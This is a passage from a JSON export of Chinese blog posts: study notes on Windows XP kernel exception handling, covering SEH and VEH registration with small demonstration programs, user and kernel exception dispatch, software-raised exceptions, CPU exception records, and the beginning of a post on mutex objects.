SEH链表结构(这个结构怎么写都行)struct _EXCEPTION{ struct _EXCEPTION* Next; DWORD Handler;};EXCEPTION_DISPOSITION _cdecl MyEexception_handler( struct _EXCEPTION_RECORD *ExceptionRecord, //异常结构体 PVOID EstablisherFrame, //SEH结构体地址 struct _CONTEXT *ContextRecord, //存储异常发生时的各种寄存器的值 栈位置等 PVOID DispatcherContext){ MessageBox(NULL, \"SEH异常处理函数执行了...\", \"SEH异常\",NULL); if (ExceptionRecord->ExceptionCode == 0xC0000094) { //ContextRecord->Eip = ContextRecord->Eip + 2; ContextRecord->Ecx = 100; return ExceptionContinueExecution; } return ExceptionContinueSearch;}int main(){ DWORD temp; _EXCEPTION Exception; //必须在当前线程堆栈的堆栈中 //fs[0]-> Exception _asm { mov eax, fs:[0] mov temp,eax lea ecx,Exception mov fs:[0],ecx } //为SEH成员赋值 Exception.Next = (_EXCEPTION*)temp; Exception.Handler = (DWORD)&MyEexception_handler; //创建异常 int val = 0; _asm { xor edx,edx xor ecx,ecx mov eax,1 idiv ecx //edx = eax /ecx mov val,ecx } //摘除刚插入的SEH _asm { mov eax, temp mov fs:[0],eax } printf(\"val = %d\",val); getchar(); return 0;} 同样，这里采用两种处理方案，只不过这次打印的值为ecx。 修改Ecx的情况如下 修改Eip的情况如下 总结 FS:[0]指向SEH链表的第一个成员 SEH链表必须在当前线程的堆栈中 只有当VEH中的异常处理函数不存在或者不处理时才会轮到SEH链表中查找（处理用户异常时） 比起VEH，SEH有着更大的利用空间，通过获取到的上下文环境，让异常处理后的程序执行你想要执行的任意代码。 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p249~p259 —— 张银奎 参考教程： 海哥逆向中级班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83547922 （My classmates-SEH学习机笔记） https://blog.csdn.net/qq_38474570/article/details/104346421 （鬼手56-VEH/SEH学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"VEH","slug":"VEH","date":"2020-08-22T02:24:04.000Z","updated":"2022-05-17T15:25:05.267Z","comments":true,"path":"2020/08/22/VEH/","link":"","permalink":"http://cata1oc.github.io/2020/08/22/VEH/","excerpt":"","text":"前言前一篇学习了用户异常的分发过程，当用户异常产生后，内核函数KiDispatchException并不是像处理内核异常那样在0环直接进行处理，而是修改3环EIP为KiUserExceptionDispatcher函数后就结束了。这样，当线程再次回到3环时，将会从KiUserExceptionDispatcher函数开始执行。 本篇，从就KiUserExceptionDispatcher入手分析它是如何调用异常处理函数处理异常的，并了解学习与之相关的VEH的概念。 KiUserDispatchException 再回过来看这个函数，有3个主要的步骤： RtlDispatchException：查找并执行异常处理函数。 ZwContinue：若RtlDispatchException返回真，说明异常被处理了，调用该函数，再次进入0环。 ZwRaiseException：若RtlDispatchException返回假，说明异常未被处理，调用该函数，进行第二轮异常分发。 本篇主要来关注RtlDispatchException是如何处理用户异常的。 RtlDispatchException用户异常分发与内核异常分发都会调用RtlDispatchException函数，但两者的实现逻辑是不同的。观察下图： 由图，处理用户异常的RtlDispatchException要多调用一个函数RtlCallVectoredExceptionHandlers。这个函数的作用就是在VEH链表中遍历，以便寻找对应的异常处理函数。 VEH与SEH什么是VEH与SEH呢，首先来说说SEH，在之前内核异常的分发中分析过处理内核异常的RtlDispatchException函数中，它的内部调用了RtlpGetRegistrationHead来查找一个异常链表，结构大致如下。 这就是SEH链表的大致结构，它是一种存在堆栈中的局部链表。本篇将要学习的VEH结构与之类似，只不过VEH是全局链表。内核的RtlDispatchException函数中只会查找SEH，用户的RtlDispatchException会先查找VEH，若异常未能得到处理，才会找SEH。 VEH基础基本思想VEH的基本思想是通过注册如下原型的回调函数来接收和处理异常。 c123LONG CALLBACK VectoredHandler( PEXCEPTION_POINTERS ExceptionInfo); ExceptionInfo：指向EXCEPTION_POINTERS结构的指针。其结构如下 Code1234typedef struct _EXCEPTION_POINTERS { PEXCEPTION_RECORD ExceptionRecord; //异常记录 PCONTEXT ContextRecord; //异常发生时的线程上下文环境}; VectoredHandler的返回值为EXCEPTION_CONTINUE_EXECUTION（-1，异常处理完毕，恢复执行）或者EXCEPTION_CONTINUE_SEARCH（0，异常未被处理，继续搜索） 回调函数注册以VectoredHandler为原型的回调函数创建好后，就可以将其注册，即添加到VEH全局链表中，当遇到对应的用户异常时，就会被查找并调用。注册回调函数的原型如下： c1234PVOID AddVectoredExceptionHandler( ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER VectorerHandler); FirstHandler：指定该回调函数的被调用顺序，若为0表示希望最后被调用；若为1表示希望最先被调用。若注册了多个回调函数，且FirstHandler都为1，那么最后注册的会最先被调用。 VectorHandler：需要注册的回调函数。 在AddVectoredExceptionHandler内部，会为每个VEH分配一个如下结构： c12345typedef struct _VEH_REGISTRATION{ _VEH_REGISTRATION* next; _VEH_REGISTRATION* prev; PVECTORED_EXCEPTION_HANDLER pfnVeh;}VEH_REGISTRATION, *PVEH_REGISTRATION; next：指向下一个VEH。 prev：指向前一个VEH。 pfnVeh：指向当前VEH的回调函数。 当有多个VEH时，这些VEH的_VEH_REGISTRATION结构组成一个环状链表。Ntdll.dll中的全局变量RtlpCalloutEntryList指向该链表的链表头（在0环中，则是通过FS:[0]找到ExceptionList再找到SEH的链表头） 回调函数注销有注册就有注销，微软提供了RemoveVectoredExceptionHandler函数用于回调函数的注销，原型如下： c123PVOID RemoveVectoredExceptionHandler( PVECTORED_EXCEPTION_HANDLER VectorerHandler); VEH实验有了VEH的基础，这里来做一个小实验。编写如下代码：（环境：Windows XP，IDE：VC++6.0） c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include \"stdafx.h\"#include //Part1: 定义指向AddVectorExceptionHandler函数原型的函数指针typedef PVOID(NTAPI *FnAddVectoredExceptionHandler)(ULONG, _EXCEPTION_POINTERS*); FnAddVectoredExceptionHandler MyAddVectoredExceptionHandler;//Part2: 定义异常处理函数LONG NTAPI VectExcepHandler(PEXCEPTION_POINTERS pExcepInfo) { MessageBox(NULL,\"VEH异常处理函数执行了...\",\"VEH异常\",MB_OK); //除0异常 if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xC0000094) { //修改发生异常时代码的Eip //pExcepInfo->ContextRecord->Eip = pExcepInfo->ContextRecord->Eip + 2; //修改发生异常时ecx的值 pExcepInfo->ContextRecord->Ecx = 98; //此处返回表示异常已处理 return EXCEPTION_CONTINUE_EXECUTION; } //此处返回表示异常未处理 return EXCEPTION_CONTINUE_SEARCH;}//Part3：主函数int main(){ //动态获取AddVectoredExceptionHandler函数地址，并将异常处理函数挂入VEH链表 HMODULE hModule = GetModuleHandle(\"Kernel32.dll\"); MyAddVectoredExceptionHandler = (FnAddVectoredExceptionHandler)::GetProcAddress(hModule,\"AddVectoredExceptionHandler\"); //参数1表示插入VEH链的头部, 0插入到VEH链的尾部 MyAddVectoredExceptionHandler(0, (_EXCEPTION_POINTERS *)&VectExcepHandler); //构造除0异常 int val = 0; _asm { xor edx, edx xor ecx, ecx mov eax, 100 idiv ecx //edx","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"用户异常的分发","slug":"用户异常的分发","date":"2020-08-21T02:17:58.000Z","updated":"2022-05-17T15:24:40.065Z","comments":true,"path":"2020/08/21/用户异常的分发/","link":"","permalink":"http://cata1oc.github.io/2020/08/21/%E7%94%A8%E6%88%B7%E5%BC%82%E5%B8%B8%E7%9A%84%E5%88%86%E5%8F%91/","excerpt":"","text":"前言上一篇学习了内核异常的分发，内核异常发生在内核层，处理起来比较简单，因为异常处理函数也在0环，不用切换堆栈；但是如果异常发生在3环，就意味着必须要切换堆栈，回到3环执行处理函数。 切换堆栈的处理方式与用户APC的执行过程几乎是一样的，唯一的区别就是执行用户APC时返回3环后执行的函数是KiUserApcDispatcher，而异常处理时返回3环后执行的函数是KiUserExceptionDispatcher。所以，理解用户APC的执行过程是理解3环异常处理的关键。 用户异常分发执行流程无论是内核异常还是用户异常，都要通过KiDispatchException进行分发，所以从该函数开始分析。 备份TrapFrame 首先还是KiDispatchException的主体部分，上一篇在分析内核异常分发时已经分析过这里了，还是有两个点需要看一下： 红色方框：KeContextFromKframes函数将TrapFrame的值备份到Context结构中，以便在返回3环处理用户异常时，可以任意修改TrapFrame。此处ebx存着TrapFrame结构的首地址，在之后的代码分析中已将ebx替换成_KTRAP_FRAME使用。 橙色方框：在判断完先前模式后，若为用户模式，则从这里进行跳转。 内核调试器 若为用户异常，则会跳转至此处，这部分和内核异常的处理类似，主要是内核调试器的处理逻辑。 红色方框：这里主要是做几个判断，首先判断是否是第一次分发，若不是第一次分发，则跳走，本篇主要围绕第一次分发过程来讲。接下来判断是否存在内核调试器（例如Windbg），若不存在内核调试器，直接跳到下方代码继续执行。若存在调试器，则接着判断该调试器是否与当前线程关联的调试器是同一个。若不是同一个，就跳转了。 紫色方框：如果是同一个调试器，就会执行到这里。此时会push相应的参数，并调用内核调试器。判断内核调试器的值，如果值不为0，说明异常被内核调试器处理掉了。跳走，异常处理完毕，甚至没有返回3环的过程。如果值不为0，说明异常未被处理，则接着往下执行。 用户调试器这里开始，是内核异常所没有的，内核异常是不会调用用户调试器的。 这里有一个函数非常关键，DbgkForwardException，先来看函数原型。 c12345BOOLEAN NTAPI DbgkForwardException( IN PEXCEPTION_RECORD ExceptionRecord, IN BOOLEAN DebugPort, IN BOOLEAN SecondChance); 它接收3个参数，含义如下： ExceptionRecord：异常记录的结构，之前有讲。 DebugPort：这个参数用来判断往哪个端口发送消息，若往调试端口发送，则值为TRUE；若往异常端口发送，则值为FALSE。 SecondChance：判断是否为第二次分发，若是则为TRUE，反之为FALSE。 这个DbgkForwardException函数，用来将异常分发给用户调试器（这一步并没有返回3环），执行过程和内核调试器类似，它会先判断DebugPort字段是否为空，如果不为空，则调用DbgkSendApiMessage将异常发给调试子系统，后者又将异常发给用户调试器。如果用户调试器把异常处理掉了，那么DbgkForwardException会返回TRUE，异常分发过程也就结束了。否则，接着往下执行。 返回3环若没有内核调试器或者内核调试器没处理，没有用户调试器或者用户调试器也没处理，就会走到这一部，接下来有一长串的代码，但是关键的只有一步。 返回3环处理，需要用到TrapFrame中保存的值，由于先前已将TrapFrame的值备份到Context结构中，所以这里可以任意修改TrapFrame的值，这部分的代码主要也就是修改TrapFrame，其中最为重要的，就是红色方框框住的修改TrapFrame.EIP的值。这个值决定了返回3环时开始执行的位置。它被设置成由内核变量KeUserExceptionDispatcher指向的一个三环函数KiUserExceptionDispatcher（属于Ntdll.dll）。返回三环后，便从KiUserExceptionDispatcher处开始执行。 至此，KiDispatcherException函数执行结束。需要注意的是，KiDispatchException并不完成返回3环的工作，它主要是将异常向不同的调试器进行分发，若调试器不存在或都不进行处理，则修改TrapFrame结构内的值，为返回3环坐准备。至于如何返回3环呢，观察下图： 由于不同类型的异常，调用KiDispatcherException的函数不同，所以会当KiDispatcherException执行完后，会返回当相应的函数继续执行。如果是CPU异常，则会返回到CommonDispatcherException函数中，并通过IRETD返回3环（CPU是通过中断门进的0环，因此用中断返回）；如果是模拟异常，则会返回到NT!KiRaiseException函数中，并通过系统调用（KiServiceExit）返回3环。无论通过那种方式，线程再次回到3环时，将执行KiUserExceptionDispatcher。 3环异常处理 这部分就不详细分析，因跳转过多，仅作简要概括（这个坑以后考虑补上）。如图，回到3环后从KiUserExceptionDispatcher处开始执行，和处理内核异常类似，它会调用RtlDispatchException，该函数会在异常链表（VEH）上找异常处理器来处理异常，在链表的尾部保存着系统注册的一个默认的异常处理器。如果前面的异常处理器都没有处理异常，那么RtlDispatchException会找到默认异常处理器调用UnhandledExceptionFilter函数（例如用户界面弹出 “应用程序错误” 对话框来终止进程）。 如果RtlDispatchException将异常处理掉，这里会调用ZwContinue重新进入0环（类似用户APC）。 在没有调试的情况下，用户态异常不会经历第二轮分发。若当前进程正在被调试，那么UnhandledExceptionFilter会返回EXCEPTION_CONTINUE_SEARCH，导致RtlDispatchException返回FALSE。异常将进入第二轮分发。 第二轮分发若RtlDispatchException返回FALSE，KiUserExceptionDispatcher会将FirstChance设置为FALSE，并进入第二轮异常分发。第二轮分发还是从KiDispatchException开始，第二次分发会调用两次DbgkForwardException函数，先后将异常发送给调试端口和异常端口（如果前者未处理异常），若两个端口都未能处理异常，则会调用KeBugCheckEx触发蓝屏异常。 总结至此，用户异常的分发就分析完结了；第二次分发的过程介绍的比较简单，因为跳转比较麻烦，但是核心逻辑不多。（完整的执行逻辑可参考软件调试p247~p248）。以下为用户异常分发的流程图，以及异常分发的综合流程图。 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p173，p246~p248 —— 张银奎 参考教程： 海哥中级预习班课程 参考链接： https://cataloc.gitee.io/blog/2020/08/10/%E7%94%A8%E6%88%B7APC%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B/ （用户APC执行过程） https://blog.csdn.net/weixin_42052102/article/details/83513729 （CSDN-My classmates学习笔记） https://blog.csdn.net/qq_38474570/article/details/104346374 （CSDN-鬼手56学习笔记） https://doxygen.reactos.org/da/d59/dbgk_8h_source.html （ReactOS-dbgk.h）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"内核异常的分发","slug":"内核异常的分发","date":"2020-08-20T09:37:26.000Z","updated":"2022-05-17T15:24:05.437Z","comments":true,"path":"2020/08/20/内核异常的分发/","link":"","permalink":"http://cata1oc.github.io/2020/08/20/%E5%86%85%E6%A0%B8%E5%BC%82%E5%B8%B8%E7%9A%84%E5%88%86%E5%8F%91/","excerpt":"","text":"前言在之前的文章中提过，异常处理机制的执行流程分为 异常记录 异常的分发 异常的处理 本篇开始，开始学习异常分发的过程。 用户层异常与内核层异常异常可以发生在用户空间，也可以发生在内核空间。正如APC一样。 无论是CPU异常还是模拟异常，是用户层异常还是内核异常，都要通过KiDispatchException函数进行分发。理解这个函数是学习异常的核心。（就像APC处理都需要调用KiDeliverApc一样） 本篇先学习较为简单的内核层异常，因为它进入KiDispatcherException异常分发函数后，主要处理过程都在内核进行，不需要再返回三环，因而逻辑较为简单。 KiDispatchException这是处理异常最重要的函数，就像处理APC的KiDeliverApc函数一样 函数原型先从函数原型开始，了解每个参数的含义 c1234567VOID KiDispatchException ( IN PEXCEPTION_RECORD ExceptionRecord, IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame, IN KPROCESSOR_MODE PreviousMode, IN BOOLEAN FirstChance) ExceptionRecord：异常记录做的事情就是初始化这个结构体。 ExceptionFrame：对于x86系统，这个值是NULL。 TrapFrame：这个就非常熟悉了，3环进0环时，保存的现场就都在这里面。 PreviousMode：先前模式，0表示内核模式，1表示用户模式。 FirstChance：判断是否是第一轮分发这个异常，对于一个异常，Windows系统最多分发两轮。1表示第一次分发，0表示第二次分发。 执行流程（内核部分）接下来，进入IDA，分析KiDispatchException处理内核异常时的执行过程： 进入函数主体（KiDispatchException）： 这里作了裁剪，以便于查看。接下来还是按照方框来分析： 红色方框：首先从这里看起，它做了一件事，将_Trap_Frame备份到Context里，这部分和处理用户APC时很像，调用的也是同一函数。 橙色方框：这里会根据KiDispatchException参数PreviousMode（先前模式），判断是内核异常还是用户层异常。本篇只关注内核异常，所以这里不跳转。 绿色方框：这里根据KiDispatchException参数FirstChance，判断是不是第一次分发，如果不是第一次就跳走。 紫色方框：这里比较关键，先看第一个紫色方框，它会先查看内核变量KiDebugRoutine标识的内核调试器是否存在（例如Windbg）： 如果不存在，就跳转。 如果内核调试器存在，它就会调用内核调试器，并判断返回值。如果返回值为1，说明异常成功被处理掉，接下来会将Context的内容返还给_Trap_Frame，异常处理过程结束，退出KiDispatchException函数。如果返回值为0，说明异常未被处理掉，则跳转。 值得注意的是，两个跳转的位置是一样的，即不存在内核调试器或者内核调试器未处理掉异常时，会跳转到同一个地方。 粉色方框：若不存在内核调试器或者内核调试器未处理掉异常时，会跳转到这里。此时会传递两个参数Context和ExceptionRecord，并调用RtlDispatchException函数。这是负责调用异常处理函数的函数。 RtlDispatchException部分： RtlDispatchException在内部调用了RtlpGetRegistrationHead，这个函数返回了fs:[0]处保存的值。根据之前学习，在0环fs:[0]指向的是KPCR，KPCR的第一个成员NtTib，而NtTib的第一个字段是ExceptionList，ExceptionList这个字段是一个指针，它指向了一个结构体_EXCEPTION_REGISTRATION_RECORD： c12345typedef struct _EXCEPTION_REGISTRATION_RECORD{ struct _EXCEPTION_REGISTRATION_RECORD *Next; PEXCEPTION_ROUTINE Handler;} EXCEPTION_REGISTRATION_RECORD; 这个结构体有两个成员，第一个成员指向下一个_EXCEPTION_REGISTRATION_RECORD，如果没有下一个结构体，则此处值为-1。第二个成员是异常处理函数。其内部结构如下： 所以RtlDispatchException的作用就是遍历异常链表，调用异常处理函数，如果异常被正确处理了，该函数返回1。如果当前异常处理函数不能处理该异常，那么调用下一个，以此类推。如果到最后也没有异常处理函数处理这个异常，返回0。 第二次分发： 绿色方框：这里是RtlDispatchException执行结束的地方。 主要逻辑：然后跟着跳转，向下看，这部分有4处跳转，其中2处橙色跳转的地方是一样的，2处红色跳转的地方是一样的。逻辑如下，首先，会判断RtlDispatchException函数的返回值，若该值为1，说明异常已经被处理，则触发橙色跳转；若值不为1，继续向下执行。这时会再次判断KiDebugRoutine标识的内核调试器是否存在，这便是二次分发。若仍然没有内核调试器，则触发红色跳转。若有，则和第一次分发时的处理一样，再次判断内核调试器是否对异常进行处理，若处理完成，触发橙色跳转，否则，触发红色跳转。 触发橙色跳转：若触发了橙色跳转，说明异常已被处理。接下来会调用KeContextToKframes将Context备份的内容返还给_Trap_Frame，异常分发结束。 触发红色跳转：若触发了红色跳转，说明异常未被处理，将会调用KeBugCheckEx函数，系统蓝屏。 总结内核异常的总体流程可以参考下图，当然用户异常的流程也在图中，下一篇会讲到。 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p244~p246 —— 张银奎 参考教程： 海哥中级预习班课程 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83507711 （CSDN-My classmates学习笔记） https://blog.csdn.net/qq_38474570/article/details/104346374 （CSDN-鬼手56学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"软件模拟异常记录","slug":"软件模拟异常记录","date":"2020-08-19T01:56:34.000Z","updated":"2022-05-17T15:23:42.285Z","comments":true,"path":"2020/08/19/软件模拟异常记录/","link":"","permalink":"http://cata1oc.github.io/2020/08/19/%E8%BD%AF%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%BC%82%E5%B8%B8%E8%AE%B0%E5%BD%95/","excerpt":"","text":"前言在上一篇介绍了CPU异常记录的过程，本篇介绍软件模拟异常的记录过程。并比对两者之间的区别。 分析软件模拟异常本次用一个小实验，分析软件模拟异常的流程 测试代码编译并运行如下代码（环境：Windows XP，IDE：VC++6.0） c123456789#include \"stdafx.h\"int main(int argc, char* argv[]){ throw 1; getchar(); return 0;} 查看反汇编在”throw 1”处下断点，运行程序，进入反汇编查看。 可以看到，它调用了函数_CxxThrowException _CxxThrowException接下来步入_CxxThrowException 发现_CxxThrowException又调用了RaiseException函数，这是一个Kernel32.dll中的导出函数 RaiseException RaiseException函数，又调用了RtlRaiseException函数，这是一个Ntdll.dll中的函数 RtlRaiseException RtlRaiseException会先调用ZwRaiseException，然后通过系统服务调用机制，调用内核函数NtRaiseException，进入内核 NtRaiseException NtRaiseException又调用了另一个内核函数KiRaiseException KiRaiseException KiRaiseException最终调用了用于异常分发的函数KiDispatchException 小结根据软件模拟异常的执行流程，可以看出最终也会调用KiDispatchException函数，和CPU异常是一样的。所以可以认为，进入异常分发的步骤后，CPU异常与软件模拟异常就没有明显的区别了。接下来，将会对部分函数进行分析，了解软件模拟异常是如何填充和构建ExceptionRecord结构体的。 ExceptionRecord结构体填充学习完CPU异常记录了解到，异常记录的核心步骤，是对_EXCEPTION_RECORD结构体的构建和初始化。这里先回顾一下该结构。 其中最重要的是ExceptionCode与ExceptionAddress两个字段的赋值。接下来，将会重新分析软件模拟异常执行流程中的一些函数，观察赋值的细节。 ExceptionAddress 再来看这个RaiseException函数，这是_CxxThrowException调用的一个3环函数，可以看到，该函数主要就是初始化ExceptionRecord结构体，其中ExceptionAddress填入的并不是发生异常处的地址，而是RaiseException函数的地址。 ExceptionCodeExceptionCode是状态异常码，其实它已在RaiseException函数的参数中出现，所以我们得单步到_CxxThrowException调用RaiseException前传递参数的位置。 通过观察反汇编，可以看到，传给RaiseException的第一个参数值（ExceptionCode）为0xE06D7363，与Windows提供的异常状态码的值并不相符。原因是在软件模拟异常的情况下，ExceptionCode的值是根据不同的编译环境而设定的，调用RaiseException函数的CxxThrowException也是如此。例如Visual C++程序抛出的异常，会通过CxxThrowException调用RaiseException函数，ExceptionCode的值固定为0xE06D7363，但是在别的编译环境下（例如.NET程序）会通过其它函数调用RaiseException函数，ExceptionCode的值则为0xE0434F4D。 KiRaiseException这里为啥还要重提一下这个函数呢。该函数在调用前还做了一件比较关键的事，将_EXCEPTION_RECORD.ExceptinCode的最高位清零，用于区分CPU异常。 总结CPU异常与软件模拟异常，最终都要调用KiDispatchException，在对异常记录这部分的流程有所不同。其中ExceptionCode与ExceptionAddress两个字段尤为关键。 参考资料参考书籍： 《软件调试 卷2：Windows平台调试》p243~p244 —— 张银奎 参考教程： 海哥中级预习班课程 参考链接： https://blog.csdn.net/qq_41988448/article/details/104989318 （CSDN-lyzddf学习笔记，他的笔记止步于此，之后的文章就不会有他笔记的引用了） https://blog.csdn.net/qq_38474570/article/details/104346316 （CSDN-鬼手56学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83501391 （CSDN-My classmates学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"CPU异常记录","slug":"CPU异常记录","date":"2020-08-18T09:32:21.000Z","updated":"2022-05-17T15:23:11.650Z","comments":true,"path":"2020/08/18/CPU异常记录/","link":"","permalink":"http://cata1oc.github.io/2020/08/18/CPU%E5%BC%82%E5%B8%B8%E8%AE%B0%E5%BD%95/","excerpt":"","text":"前言从本篇开始，进入异常专题，这部分内容就比较关键了，因为异常这种机制，大部分操作系统都有一套自己的规则，大部分漏洞利用手法也和异常有关，前面的内容如果是基础，那么异常就是核心了。之前曾在中断与异常这篇提到过异常，当时只是简要总结了一下异常与中断的差异，现在来从异常的本质开始学习。 异常执行流程异常产生后，首先是要记录异常信息（异常的类型、异常发生的位置等），然后要寻找异常的处理函数，这部分称为异常的分发，最后找到异常处理函数并调用，这一步称为异常处理。 之后关于异常的文章，也将会按照这三个主线展开：异常记录，异常分发，异常处理。 异常的分类异常主要分为两种： CPU产生的异常 软件模拟产生的异常 例一：在编程语言中，若CPU检测到除数为0，便会抛出异常（CPU产生的异常） 例二：一些高级的编程语言，可以自己抛出异常（软件模拟产生的异常） 异常记录本篇以CPU异常为主，根据其执行流程，学习并了解异常执行的第一步，异常记录。 除0异常执行流程以除0异常为例，它的执行流程如下所示。 中断处理函数做了什么事先来看一张中断描述符表 查阅中断描述符表，得知除0异常，会调用0号中断处理函数。接下来进入IDA（打开ntoskrnl.exe），看看0号中断都做了什么。 按下ALT+T，然后直接搜索_IDT，找到IDT表反汇编，进入0号中断处理函数。 进入0号中断处理函数后，开头部分的代码，是不是非常眼熟，可以比对一下来看。 这部分代码的主要作用就是保存现场，和API函数进0环时的KiSystemService函数保存现场的方式一样，这部分可以参考此篇文章。 接着往下看 可以看到，直到0号中断处理函数结束都没有对异常进行处理，反而是经过跳转，调用了另一个函数CommonDispatchException。为何中断处理函数不直接把异常处理掉呢？因为微软在设计时，希望程序员自己能够对异常进行处理，因此在中断处理函数中并没有对异常进行处理。 中断处理函数调用了CommonDispatchException，步入该函数 该函数构造了一个_EXCEPTION_RECORD结构体，并赋值，接着调用了KiDispatchException函数。KiDispatchException函数通常用来分发异常，目的是找到异常的处理函数。 至此，异常记录部分结束。 _EXCEPTION_RECORD通过中断处理函数的流程，可以看到，异常记录只做了一件事，就是初始化_EXCEPTION_RECORD结构体。所以这个结构体就显得格外重要了，先来看看它的结构。 图中标明了字段的含义，这里对部分字段进一步解释： ExceptionCode：异常状态码，微软给Windows系统中的每一种状态都设置了状态码。这部分可以参考MSDN对状态码的描述。根据中断处理函数传递给CommonDispatchException的参数，可以得到状态码0xC0000094。查询状态码列表，可得该状态码表示的正是除零异常。 ExceptionFlags：异常状态，0表示CPU异常，1表示软件模拟异常，8表示堆栈异常（参考软件调试，卷2，p241）。 ExceptionRecord：通常为0，若出现内嵌异常（处理一个异常时发生另一个异常）时，它指向下一个异常。 ExceptionAddress：异常发生地址，该值通过_Trap_Frame(+0x68)处获得，发生异常时会调用中断处理函数，EIP会被临时存到TrapFrame，在中断处理函数时，会将该地址赋给参数，再传递给CommonDispatchException函数。 小结：ExceptionCode与ExceptionAddress是最为重要的两个字段，也务必记住两个字段取值的来源。 总结本篇主要介绍了CPU异常执行流程中的第一步，异常记录，对于CPU产生的异常，它首先会调用相应异常的中断处理函数，接着调用CommonDispatchException构建并初始化_EXCEPTION_RECORD结构体，最后再调用KiDispatchException分发异常。 参考资料参考课程： 海哥中级预习班课程 参考链接： https://blog.csdn.net/qq_41988448/article/details/104989318 （CSDN-lzyddf学习笔记） https://blog.csdn.net/qq_38474570/article/details/104346316 （CSDN-鬼手56学习笔记） https://blog.csdn.net/weixin_42052102/article/details/83501391 （CSDN-My classmates学习笔记） https://en.wikipedia.org/wiki/Interrupt_descriptor_table （维基百科-IDT） https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55?redirectedfrom=MSDN （MSDN-NTSTATUS Values）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"互斥体","slug":"互斥体","date":"2020-08-17T06:55:14.000Z","updated":"2022-05-17T15:21:47.983Z","comments":true,"path":"2020/08/17/互斥体/","link":"","permalink":"http://cata1oc.github.io/2020/08/17/%E4%BA%92%E6%96%A5%E4%BD%93/","excerpt":"","text":"前言前一篇文章学习了信号量（Semaphore），信号量的引出是为了解决事件（Event）解决不了的同步问题，例如生产者消费者问题。本篇将要学习的互斥体（Mutant），同样是为了解决信号量与事件解决不了的事情而诞生的。 为什么要有互斥体等待对象被遗弃问题互斥体（Mutant）与事件（Event）和信号量（Semaphore）一样，都可以用来进行线程的同步控制。但需要指出的是，这几个对象都是内核对象，这就意味着，通过这些对象可以进行跨进程的线程同步控制，比如： 观察上图，X和Y分别属于不同进程中的线程，它们都要用到等待对象Z，正常情况下，通过事件或者信号量便可以完成同步控制。但是在极端情况下，如果B进程的Y线程还没有来得及调用修改SignalState的函数（例如SetEvent）就挂掉了，那么等待对象Z将被遗弃，这也就意味着X线程将永远等下去！在等待对象被遗弃的情况下，事件或信号量将无法继续维持线程的同步，而互斥体可以解决此类问题。 重入问题事件只允许同一时间有一个线程进入临界区，信号量允许同一时间有多个线程进入临界区。考虑一种特殊情况 上图中，由于代码设计的问题，在WaitForSingleObject等待A对象后，内部代码又调用了WaitForMultipleObjects等待A对象。这种情况被称作重入，当调用一次WaitForSingleObject后，A对象的SignalState变为了0，此时已经没有信号了，当调用WaitForMultipleObjects时，由于被等待对象A是没有信号的，因此代码会永远困在该函数内部。这种情况叫做死锁。事件和信号量面对重入问题都显得无能为力，而互斥体可以解决重入问题，避免死锁的情况发生。 互斥体的创建与信号设置前面提到，互斥体（Mutant）可以解决信号量（Semaphore）和事件（Event）解决不了的问题，这里就从结构，用法等方面开始了解互斥体。 互斥体结构首先来看互斥体结构，它所包含的字段较多 Code123456789101112_KMUTANT +0x000 Header : _DISPATCHER_HEADER +0x000 Type +0x001 Absolute +0x002 Size +0x003 Inserted +0x004 SignalState +0x008 WaitListHead +0x010 MutantListEntry : _LIST_ENTRY +0x018 OwnerThread : Ptr32 _KTHREAD +0x01c Abandoned : UChar +0x01d ApcDisable : UChar Type：互斥体的Type值为2。 SignalState：互斥体的信号通过两个函数进行设置： 互斥体创建函数CreateMutex。 互斥体信号设置函数ReleaseMutex。 MutantListEntry：在KThread+0x10处有一个MutantListHead字段，指向链表头，链表圈着所有该线程拥有的互斥体线程，这个MutantListEntry就是挂在链表的位置（例如Kapc的ApcListEntry其结构就是挂在APC链表的位置，因此通过APC链表取的Kapc首地址时需要,减去ApcListEntry在结构体中的偏移） OwnerThread：正在拥有互斥体的线程；由CreateMutex函数第二个参数决定。 Abandoned：是否已经被放弃不用。 ApcDisable：是否禁用内核APC。 CreateMutex函数CreateMutex是用来创建互斥体的函数，函数原型如下，其中第二个参数比较重要。 Code1234567HANDLE CreateMutex( LPSECURITY_ATTRIBUTE SlpMutexAttributes, // 指向安全属性的指针 BOOL bInitialOwner, // 初始化互斥对象的所有者 LPCTSTR lpName // 指向互斥对象名的指针);CreateMutex -> NtCreateMutant(内核函数) -> KeInitializeMutant(内核函数) 创建互斥体，就是对互斥体结构进行初始化，大致如下： Code123456初始化Mutant结构体： MUTANT.Header.Type = 2; MUTANT.Header.SignalState = bInitialOwner?0:1; MUTANT.OwnerThread = 当前线程/NULL; MUTANT.Abandoned = 0; MUTANT.ApcDisable = 0; 该函数最重要的是第二个参数bInitialOwner，它对互斥体结构中的两个字段都有影响： SignalState： bInitialOwner=TRUE：SignalState KeReleaseMutant(内核函数) 